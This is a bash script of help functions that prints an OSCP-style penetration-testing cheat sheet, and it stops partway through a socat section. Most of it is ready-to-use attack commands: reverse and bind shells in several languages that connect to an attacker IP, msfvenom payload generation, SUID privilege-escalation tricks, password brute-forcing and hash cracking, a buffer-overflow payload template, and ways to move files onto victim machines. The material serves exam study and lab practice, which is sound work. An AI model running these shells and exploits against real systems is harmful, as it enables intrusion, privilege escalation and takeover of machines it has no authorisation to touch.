#!/bin/bash

# much of hte information below was stolen/borrowed from the following 
# resouces
#
# https://scund00r.com/all/oscp/2018/02/25/passing-oscp.html

if [ -z ${ip+x} ]; then ip=10.10.10.10 ; fi
if [ -z ${port+x} ]; then port=4444 ; fi

function show-tput-colors {
for fg_color in {0..7}; do
        set_foreground=$(tput setaf $fg_color)
        for bg_color in {0..7}; do
            set_background=$(tput setab $bg_color)
            echo -n $set_background$set_foreground
            printf ' F:%s B:%s ' $fg_color $bg_color
        done
        echo $(tput sgr0)
    done
}

function print-figlet() {
    if which figlet > /dev/null
    then
        figlet $1
    else
       echo $1
    fi
}



# Variables for terminal requests.
[[ -t 2 ]] && {
    alt=$(      tput smcup  || tput ti      ) # Start alt display
    ealt=$(     tput rmcup  || tput te      ) # End   alt display
    hide=$(     tput civis  || tput vi      ) # Hide cursor
    show=$(     tput cnorm  || tput ve      ) # Show cursor
    save=$(     tput sc                     ) # Save cursor
    load=$(     tput rc                     ) # Load cursor
    bold=$(     tput bold   || tput md      ) # Start bold
    stout=$(    tput smso   || tput so      ) # Start stand-out
    estout=$(   tput rmso   || tput se      ) # End stand-out
    under=$(    tput smul   || tput us      ) # Start underline
    eunder=$(   tput rmul   || tput ue      ) # End   underline
    reset=$(    tput sgr0   || tput me      ) # Reset cursor
    blink=$(    tput blink  || tput mb      ) # Start blinking
    italic=$(   tput sitm   || tput ZH      ) # Start italic
    eitalic=$(  tput ritm   || tput ZR      ) # End   italic
[[ $TERM != *-m ]] && {
    red=$(      tput setaf 1|| tput AF 1    )
    green=$(    tput setaf 2|| tput AF 2    )
    yellow=$(   tput setaf 3|| tput AF 3    )
    blue=$(     tput setaf 4|| tput AF 4    )
    magenta=$(  tput setaf 5|| tput AF 5    )
    cyan=$(     tput setaf 6|| tput AF 6    )
}
    white=$(    tput setaf 7|| tput AF 7    )
    default=$(  tput op                     )
    eed=$(      tput ed     || tput cd      )   # Erase to end of display
    eel=$(      tput el     || tput ce      )   # Erase to end of line
    ebl=$(      tput el1    || tput cb      )   # Erase to beginning of line
    ewl=$eel$ebl                                # Erase whole line
    draw=$(     tput -S <<< '   enacs
                                smacs
                                acsc
                                rmacs' || { \
                tput eA; tput as;
                tput ac; tput ae;         } )   # Drawing characters
    back=$'\b'
} 2>/dev/null ||:

function help-tmux {
    echo ${reset}${red}${bold}
    echo "Disable mouse so you can copy and paste"
    echo $green
    echo "ctrl-b :set -g mouse off"
    echo

}

function help-privesc-bash {
echo "Note: This will not work on Bash versions 4.4 and above."
echo ""
echo "When in debugging mode, Bash uses the environment variable PS4 to display an extra prompt for debugging statements."
echo ""
echo "Run the /usr/local/bin/suid-env2 executable with bash debugging enabled and the PS4 variable set to an embedded command which creates an SUID version of /bin/bash:"
echo "env -i SHELLOPTS=xtrace PS4='\$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2"
echo ""
echo "/tmp/rootbash -p"
echo ""

}

function help-privesc-function {
echo "In Bash versions <4.2-048 it is possible to define shell functions with names that resemble file paths, then export those functions so that they are used instead of any actual executable at that file path."
echo ""
echo "Verify the version of Bash installed on the Debian VM is less than 4.2-048:"
echo ""
echo "/bin/bash --version"
echo ""
echo "Create a Bash function with the name "/usr/sbin/service" that executes a new Bash shell (using -p so permissions are preserved) and export the function:"
echo ""
cat << EOF
function /usr/sbin/service { /bin/bash -p; }
export -f /usr/sbin/service
}
EOF
}

function help-privesc-shared-object {

cat << EOF

#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
        setuid(0);
        system("/bin/bash -p");
    }

EOF
echo gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c 

cat << EOF
int main() {
        setuid(0);
                system("/bin/bash -p");
            }

EOF

echo "gcc -o service /home/user/tools/suid/service.c"

}

function help-fuzz() {
    help-wfuzz
}

function help-wfuzz() {
    echo ${reset}${green}
    echo 'wfuzz -c -f file.out -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u "http://website.name" -H "Host: FUZZ.website.name" --hl 107'
    echo "${yellow}"
    echo "-c"
    echo "-f output filename"
    echo "-w wordlist"
    echo "-u url"
    echo "-H Host: FUZZ.website.name"
    echo "         FUZZ will be fuzzed"
    echo "-hl is the output to exclude"
    echo "    check the man page"
    echo "${reset}"

}

function help-john () {
    help-cracking
}

function help-hashcat() {
    help-cracking
}

function help-cracking () {
    echo ${reset}${red}${bold}
    echo \# John and shadow file
    echo $green
    echo 'unshadow passwd shadow > unshadow.db'
    echo 'john unshadow.db'
    echo ${reset}${white}${bold}
    echo 'Hashcat SHA512 $6$ shadow file'
    echo ${reset}${green}
    echo 'hashcat -m 1800 -a 0 hash.txt rockyou.txt --username'
    echo ${reset}${white}${bold}
    echo 'Hashcat MD5 $1$ shadow file'
    echo ${reset}${green}
    echo 'hashcat -m 500 -a 0 hash.txt rockyou.txt --username'
    echo ${reset}${white}${bold}
    echo 'Hashcat MD5 Apache webdav file'
    echo ${reset}${green}
    echo 'hashcat -m 1600 -a 0 hash.txt rockyou.txt'
    echo ${reset}${white}${bold}
    echo Hashcat SHA1
    echo ${reset}${green}
    echo 'hashcat -m 100 -a 0 hash.txt rockyou.txt --force'
    echo ${reset}${white}${bold}
    echo 'Hashcat Wordpress'
    echo ${reset}${green}
    echo 'hashcat -m 400 -a 0 --remove hash.txt rockyou.txt'
    echo ${reset}${white}${bold}
    echo 'SHA512 with hash'
    echo ${reset}${green}
    echo 'sudo hashcat -m 1710 backdoor --force /usr/share/wordlists/rockyou.txt '
    echo $reset
}


function help-brute () {
echo ${reset}${red}${bold}
echo RDP user with password list
echo ${reset}${green}
echo "ncrack -vv --user offsec -P passwords rdp://$ip"
echo ${reset}${red}${bold}
echo SSH user with password list
echo ${reset}${green}
echo "hydra -l user -P pass.txt -t 10 $ip ssh -s 22"
echo ${reset}${red}${bold}
echo "Hydra against basic authentication"
echo ${reset}${green}
echo "hydra -l bob -P /usr/share/seclists/Passwords/darkweb2017-top1000.txt  -e ns http-get://$IP/protected"
echo ${reset}${red}${bold}
echo "Hydra against form post authentication"
echo ${reset}${green}
echo "hydra -L user -P pass 10.10.114.147 http-post-form '/login:username=^USER^&password=^PASS^:incorrect' "
echo FTP user with password list
echo ${reset}${green}
echo "medusa -h $ip -u user -P passwords.txt -M ftp"
echo
}

function help-hydra () {
echo ${reset}${red}${bold}
print-figlet "Hydra Brute"
if which tldr > /dev/null; then tldr hydra;echo ; fi
echo ${reset}${red}${bold}
echo SSH user with password list
echo ${reset}${green}
echo "hydra -l lin -P locks.txt ssh://10.10.111.12 | tee ../hydra-ssh.txt"
# echo "hydra -l user -P pass.txt -t 10 $ip ssh -s 22"
echo ${reset}${red}${bold}
echo "Hydra against basic authentication"
echo ${reset}${green}
echo "hydra -l bob -P /usr/share/seclists/Passwords/darkweb2017-top1000.txt  -e ns http-get://$IP/protected"
echo 
}


function help-payloads () {
echo ${reset}${red}${bold}
print-figlet "MSFVenom Payloads"
if which tldr > /dev/null; then tldr msfvenom ;echo ; fi
echo "${reset}${yellow}"
echo "   msfvenom -p [payload] -f [format] LHOST=[your ip] LPORT=[your listener port]"
echo "${green}   - PHP reverse shell"
echo ""
echo "${yellow}   msfvenom -p php/meterpreter/reverse_tcp LHOST=11.10.10.10 LPORT=4443 -f raw -o shell.php"
echo ""
echo ${green}     - Java WAR reverse shell
echo "${yellow}   msfvenom -p java/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -f war -o shell.war"
echo ""
echo "${green}    - Linux bind shell"
echo "${yellow}   msfvenom -p linux/x86/shell_bind_tcp LPORT=4443 -f c -b \"\x00\x0a\x0d\x20\" -e x86/shikata_ga_nai"
echo ${white}
echo Linux FreeBSD reverse shell
echo ${green}
echo "msfvenom -p bsd/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -f elf -o shell.elf"

cat << "EOF"

# Linux C reverse shell
msfvenom  -p linux/x86/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -e x86/shikata_ga_nai -f c

# Windows non staged reverse shell
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -e x86/shikata_ga_nai -f exe -o non_staged.exe

# Windows Staged (Meterpreter) reverse shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4443 -e x86/shikata_ga_nai -f exe -o meterpreter.exe

# Windows Python reverse shell
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 EXITFUNC=thread -f python -o shell.py

# Windows ASP reverse shell
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -f asp -e x86/shikata_ga_nai -o shell.asp

# Windows ASPX reverse shell
msfvenom -f aspx -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -e x86/shikata_ga_nai -o shell.aspx

# Windows JavaScript reverse shell with nops
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -f js_le -e generic/none -n 18

# Windows Powershell reverse shell
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -e x86/shikata_ga_nai -i 9 -f psh -o shell.ps1

# Windows reverse shell excluding bad characters
msfvenom -p windows/shell_reverse_tcp -a x86 LHOST=10.10.10.10 LPORT=4443 EXITFUNC=thread -f c -b "\x00\x04" -e x86/shikata_ga_nai

# Windows x64 bit reverse shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -f exe -o shell.exe

# Windows reverse shell embedded into plink
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o shell_reverse_msf_encoded_embedded.exe

EOF

}

function help-msfvenom {
    help-payloads
}

function help-shells {
echo "${red}Bash    ${white} bash -i >& /dev/tcp/$ip/$port 0>&1${reset}"
echo "${red}PHP     ${white}php -r '$sock=fsockopen(\"$ip\",$port);exec(\"/bin/sh -i <&3 >&3 2>&3\");'${reset}"
echo "${red}Python  ${white}	python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
echo "${red}NC v1   ${white} nc -e /bin/sh $ip $port ${reset}"
echo "${red}NC v2   ${white} rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $ip $port >/tmp/f${reset}"
echo "${red}Perl    ${white} perl -e 'use Socket;\$i=\"$ip\";\$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
}

function help-upgradeshell {
    help-shellupgrade
}

function help-shellupgrade {
echo ${red}${bold}
print-figlet "Upgrade Shells"
echo $reset${white}
echo "Enter while in reverse shell"
echo ${green}
echo "python -c 'import pty; pty.spawn(\"/bin/bash\")'"
echo ""
echo "Ctrl-Z"
echo ${white}
echo "In Kali"
echo ${green}
echo "stty raw -echo"
echo "fg"
echo ""
echo ${white}
echo "In reverse shell"
echo ${green}
echo "reset"
echo "export SHELL=bash"
echo "export TERM=xterm-256color"
echo "stty rows <num> columns <cols>"
echo "stty -a  # will print out your columns for you"

}

function help-filetransfer {
    help-filetransfer-http

}

function help-filetransfer-http {

    cat << "EOF"

    # In Kali
    python -m SimpleHTTPServer 80

    # In reverse shell - Linux
    wget 10.10.10.10/file

    # In reverse shell - Windows
    powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.10.10/file.exe','C:\Users\user\Desktop\file.exe')"

    # wget
    wget -O report.pdf https://www.someplace.com/report_you_want.pdf

    # curl
    curl -o report.pdf https://www.someplace.com/report_you_want.pdf

    # axel
    axel -a -n 20 -o report_axel.pdf https://www.someplace.com /reports/-sample-report-2013.pdf

    # nc
    nc -lvp 6666 < getr00t.c
    
    # tftp
    TFTP

    In Kali, create /tftpboot/ directory specifically only for TFTP daemon service -- Setup TFTP on Attacker Machine

    atftpd –daemon –port 69 <directory>
    service atftpd start
    cp <file> /tftpboot/

    Command on victim machine

    tftp -i <ip address of attacker> GET <file name>



EOF
}

function help-filetransfer-ftp {
echo $white
echo This process can be mundane, a quick tip would be to be to name the filename as ‘file’ on your kali machine so that you don’t have to re-write the script multiple names, you can then rename the file on windows. $reset
echo
echo ${red}${bold}In Kali$reset
echo ${green} python -m pyftpdlib -p 21 -w $reset
echo
echo ${red}${bold}In reverse shell $reset
echo $green
cat << "EOF"
echo open 10.10.10.10 > ftp.txt
echo USER anonymous >> ftp.txt
echo ftp >> ftp.txt
echo bin >> ftp.txt
echo GET file >> ftp.txt
echo bye >> ftp.txt

EOF

echo ${red}${bold}Execute $reset
echo ${green}ftp -v -n -s:ftp.txt $reset
echo ""
cat << "EOF"
apt-get install pure-ftpd
setup-ftp
username: myuser, pswd: lab
EOF
}

function help-filetransfer-tftp {
echo ${white}
echo [i]  This is a generi TFTP file transfer $reset
echo
echo ${red}${bold}[1]   In Kali
echo $green
echo "    atftpd --daemon --port 69 /tftp"
echo
echo ${red}[2]   In reverse shell
echo ${green}
echo "    tftp -i $ip GET nc.exe"
}


function help-filetransfer-vbs {
echo "${white}[i]  When FTP/TFTP fails you, this wget script in VBS was the go to on Windows machines.${reset}"
echo ""
echo "${red}${bold}[1]   In reverse shell"
echo "$green"
cat << EOF
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET",strURL,False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile,True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1,1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
EOF

echo
echo ${red}${bold}[2]   Execute
echo $green
echo "   cscript wget.vbs http://10.10.10.10/file.exe file.exe"
echo $reset
}


function help-bufferoverflow {
echo ${bold}${red}Buffer Overflow
echo $white
echo Offensive Security did a fantastic job in explaining Buffer Overflows, It is hard at first but the more you do it the better you understand. I had re-read the buffer overflow section multiple times and ensured I knew how to do it with my eyes closed in preparation for the exam. Triple check the bad characters, don’t just look at the structure and actually step through each character one by one would be the best advice for the exam.
echo $green
echo
cat << "EOF"
# Payload
payload = "\x41" * <length> + <ret_address> + "\x90" * 16 + <shellcode> + "\x43" * <remaining_length>

# Pattern create
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <length>

# Pattern offset
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l <length> -q <address>

# nasm
/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
nasm > jmp eax

# Bad characters
badchars = (
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" )

EOF
echo $reset
}

function help-impacket {
echo "sudo impacket-smbserver -smb2support files `pwd` -username bob -password bob"
}

function help-nmap {
echo ${red}${bold}
figlet Nmap
echo Quick TCP Scan${reset}
echo
echo "${green}nmap -sC -sV -vv -oA quick 10.10.10.10"
echo ${red}${bold}
echo Quick UDP Scan
echo $reset
echo "${green}nmap -sU -sV -vv -oA quick_udp 10.10.10.10"
echo ${red}${bold}
echo Full TCP Scan
echo $reset
echo "${green}nmap -sC -sV -p- -vv -oA full 10.10.10.10"
echo ${red}${bold}
echo Port knock
echo $reset
echo "${green}for x in 7000 8000 9000; do nmap -Pn --host_timeout 201 --max-retries 0 -p $x 10.10.10.10; done"
}

function help-webscan {
    help-gobuster
}

function help-metasploit {

echo "Dirbuster functionality"
echo "use auxiliary/scanner/http/dir_scanner"
echo "set RHOSTS 10.0.0.27"
echo "set RPORT 1234"
echo "run"
echo ""
echo "use multi/handler"
echo "set payload windows/meterpreter/reverse_tcp"
echo "set LHOST tun0"
echo "set LPORT 6666"
echo "exploit"

}

function help-gobuster {
echo ${red}${bold}
if which figlet > /dev/null; then figlet gobuster;echo ; fi
echo ${white}
gobuster -h
echo "$white"
echo Gobuster quick directory busting
echo ${reset}${green}
echo "gobuster dir -u 10.10.10.10 -w /usr/share/seclists/Discovery/Web_Content/common.txt -t 80 -a Linux"
echo "$white"
echo Gobuster comprehensive directory busting
echo ${reset}${green}
echo "gobuster dir -s 200,204,301,302,307,403 -u 10.10.10.10 -w /usr/share/seclists/Discovery/Web_Content/big.txt -t 80 -a 'Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0'"
echo "$white"
echo Gobuster search with file extension
echo ${reset}${green}
echo "gobuster dir -u 10.10.10.10 -w /usr/share/seclists/Discovery/Web_Content/common.txt -t 80 -a Linux -x .txt,.php"
echo "$white"
echo Nikto web server scan
echo ${reset}${green}
echo "nikto -h 10.10.10.10"
echo "$white"
echo Wordpress scan
echo ${reset}${green}
echo "wpscan --url 10.10.10.10"
echo ${reset}${white}
echo Aggresive plugin detection
echo ${reset}${green}
echo "wpscan --url http://playground.cyberpunk.rs:81 --wp-content-dir /wp-content/ --enumerate vp --plugins-detection aggressive"
}

function help-portchecking {

echo ${red}${bold}
if which figlet > /dev/null; then figlet Port Checkin;else echo Port Checking ; fi
echo
echo Netcat banner grab
echo ${reset}${green}
echo "nc -v 10.10.10.10 port"
echo ${red}${bold}
echo Telnet banner grab
echo ${reset}${green}
echo "telnet 10.10.10.10 port"
echo
}

function help-findsuid {
echo "find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null"
echo ""
echo "find / -type f -perm -4000 2>/dev/null"
echo ""
echo "find / -type f -perm -2000 2>/dev/null"

}


function help-smb {
echo ${red}${bold}
if which figlet > /dev/null; then figlet Vulnerability Scan;else echo Vulnerability Scan; fi
echo ${reset}${green}
echo "nmap -p 445 -vv --script=smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse 10.10.10.10"
echo ${red}${bold}
echo "SMB Users & Shares Scan"
echo ${reset}${green}
echo "nmap -p 445 -vv --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.10.10"
echo ${red}${bold}
echo Enum4linux
echo ${reset}${green}
echo "enum4linux -a 10.10.10.10"
echo ${red}${bold}
echo Null connect
echo ${reset}${green}
echo "rpcclient -U "" 10.10.10.10"
echo ${red}${bold}
echo Connect to SMB share
echo ${reset}${green}
echo "smbclient //MOUNT/share"
echo
}

function help-snmp {
echo ${red}${bold}
print-figlet snmp
echo ${reset}${green}
echo SNMP enumeration
echo ${red}${bold}
echo "snmp-check 10.10.10.10"
echo
}

function help-zonexfer {
    echo "To check for DNS transfer, you can use the host command:"
    echo "host -t axfr domain.name dns-server"
    echo "You can also use the dig command:"
    echo "dig axfr @dns-server domain.name"
}

function help-python-servers {
echo ${red}${bold}
print-figlet Python Servers
echo ${red}${bold}
echo Web Server
echo ${reset}${green}
echo python -m SimpleHTTPServer 80
echo ${red}${bold}
echo FTP Server
echo ${reset}${green}
echo # Install pyftpdlib
echo pip install pyftpdlib
echo ${reset}${green}
echo # Run (-w flag allows anonymous write access)
echo python -m pyftpdlib -p 21 -w
echo
}

function help-reverseshells {
echo ${red}${bold}
print-figlet Reverse Shells
echo Bash shell
echo ${reset}${green}
echo "bash -i >& /dev/tcp/10.10.10.10/4443 0>&1"
echo ${white}
echo "Netcat without -e flag"
echo ${reset}${green}
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 4443 >/tmp/f"
echo ${white}
echo "Netcat Linux"
echo ${reset}${green}
echo "nc -e /bin/sh 10.10.10.10 4443"
echo ${white}
echo Netcat Windows
echo ${reset}${green}
echo "nc -e cmd.exe 10.10.10.10 4443"
echo ${white}
echo Python
echo ${reset}${green}
echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",4443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
echo ${white}
echo Perl
echo ${reset}${green}
echo "perl -e 'use Socket;$i=\"10.10.10.10\";\$p=4443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
echo
}

function help-remotedesktop {
echo ${red}${bold}
print-figlet Remote Desktop
echo ${red}${bold}
echo Remote Desktop for windows with share and 85% screen
echo ${reset}${green}
echo "rdesktop -u username -p password -g 85% -r disk:share=/root/ 10.10.10.10"
echo
}

function help-powershell {
echo ${red}${bold}
print-figlet Powershell
echo ${white}
echo Non-interactive execute powershell file
echo ${reset}${green}
echo "powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File file.ps1"
echo ${white}
echo Run file as another user with powershell.
echo ${reset}${green}
cat << "EOF"
echo $username = '<username>' > runas.ps1
echo $securePassword = ConvertTo-SecureString "<password>" -AsPlainText -Force >> runas.ps1
echo $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword >> runas.ps1
echo Start-Process C:\Users\User\AppData\Local\Temp\backdoor.exe -Credential $credential >> runas.ps1
EOF
echo ${white}
echo "Launch powershell as the admin whenever possible"
echo ${reset}${green}
echo "set-ExecutionPolicy Unrestricted"
echo ""
echo "get-ExecutionPolicy"
echo ${white}
echo "powershell file transfers"
echo ${reset}${green}
echo "powershell -c \"(new-object System.Net.WebClient).DownloadFile('http://10.11.0.4/wget.exe','C:\Users\bob\Desktop\wget.exe’)\""
echo ${white}
echo "Powershell reverse shell"
echo ${reset}${green}
cat << "EOF"
$client = New-Object
System.Net.Sockets.TCPClient('10.11.0.4',443);

$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};

while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
{
    $data = (New-Object -TypeName
    System.Text.ASCIIEncoding).GetString($bytes,0,$i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + ’PS ’ + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $strearn.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush();
}
$client.Close();

EOF
echo ${reset}

echo ${white}
echo "Powershell bind shell"
echo ${reset}${green}
cat << "EOF"
$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',443);
$listener.start();

$client = $listener.AcceptTcpClient();
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};

while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
{
    $data = (New-Object -TypeName
    System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + ’PS ’ + (pwd).Path + ’> ';
    $sendbyte =
    ([text.encoding]::ASCII).GetBytes($sendback2);
    $strearn.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
}

$client.Close();
$listener.Stop()

EOF

}

function help-proof {
echo ${red}${bold}
print-figlet "Proofs"
echo
echo Linux proof
echo ${reset}${green}
echo "hostname && whoami && cat proof.txt && /sbin/ifconfig"
echo ${red}${bold}
echo Windows proof
echo ${reset}${green}
echo "hostname && whoami.exe && type proof.txt && ipconfig /all"
echo

}

function help-tunnel {
echo ${red}${bold}
print-figlet "SSH Tunneling / Pivoting"
echo
echo sshuttle
echo ${reset}${green}
echo "sshuttle -vvr user@10.10.10.10 10.1.1.0/24"
echo ${red}${bold}
echo Local port forwarding
echo ${reset}${green}
echo "ssh <gateway> -L <local port to listen>:<remote host>:<remote port>"
echo ${red}${bold}
echo Remote port forwarding
echo ${reset}${green}
echo "ssh <gateway> -R <remote port to bind>:<local host>:<local port>"
echo ${red}${bold}
echo Dynamic port forwarding
echo ${reset}${green}
echo "ssh -D <local proxy port> -p <remote port> <target>"
echo ${red}${bold}
echo "Plink local port forwarding"
echo ${reset}${green}
echo "plink -l root -pw pass -R 3389:<localhost>:3389 <remote host>"
echo

}

function help-processes {

    echo ${red}${bold}
    echo "Killing a Job"
    echo ${green}
    echo "kill %1 #will kill job 1"
    echo
    echo "jobs"
    echo ""
    echo "fg"
    echo "bg"

}

function help-comparingfiles {
    echo ${red}${bold}
    echo "comparing files"
    echo ${reset}${green}
    echo "comm file1.txt file2.txt"
    echo
    echo "diff file1.txt file2.txt"
    echo
    echo "vimdiff file1.txt file2.txt"
    echo ${white}
    echo " ctrl-w and arrow = change windows"
    echo " ] C change"
    echo " [ C change "
    echo " D + O other to current"
    echo " D + P change in current to other"
}

function help-netcat {
    echo ${red}${bold}
    print-figlet "netcat"
    echo ${reset}${white}
    echo "using netcat to connect to a port"
    echo ${green}
    echo "nc -n -v $ip \$port"
    echo ${white}
    echo "Using netcat as a server/listener"
    echo ${green}
    echo 'nc -lnvp $port'
    echo ${white}
    echo "Connect to the listener with a client"
    echo ${green}
    echo "nc -nv $ip \$port"
    echo ${white}
    echo "Transfering files with netcat"
    echo ${green}
    echo "nc -lnvp \$port > incomming.exe"
    echo ""
    echo "nc -nv $ip 4444 < /usr/share/windows/wget.exe"
    echo ${white}
    echo "You won't get any feedback when it's done"
    echo ""
    echo "Remote administration with -e by redirecting STDERR STDOUT and STDIN"
    echo ""
    echo "netcat bind shell"
    echo ${green}
    echo "nc -nvlp 4444 -e cmd.exe"
    echo ""
    echo "nc $ip 4444 "
    echo "   You will catch the cmd.exe prompt"
    echo ${white}
    echo "Reverse shell scenario"
    echo ${green}
    echo "nc $ip 4444 -e /bin/bash"
    echo ${white}
    echo "When you connect to the shell you will receive the prompt"

}

function help-socat {
    echo "${red}${bold}"
    print-figlet "socat"
    echo ${reset}${white}
    echo "socat is colon delimited"
    echo ${reset}${white}
    echo "connecting with socat"
    echo "socat - TCP4:${ip}:${port}"
    echo ""
    echo "- the hiphen is to pass stdin to the service"
    echo ""
    echo "starting a socat listener" 
    echo ""
    echo "sudo socat TCP4-LISTEN:443 STDOUT"
    echo ""
    echo "File transfers"
    echo ""
    echo "sudo socat TCP4-LISTEN:443,fork file:secret_passwords.txt"
    echo ""
    echo "socat TCP4:${ip}:${port} file:received_secret_passwords.txt,create"
    echo ""
    echo "socat reverse shells"
    echo ""
    echo "socat -d -d TCP4-LISTEN:$port STDOUT"
    echo " -d -d increases the verbosity"
    echo ""
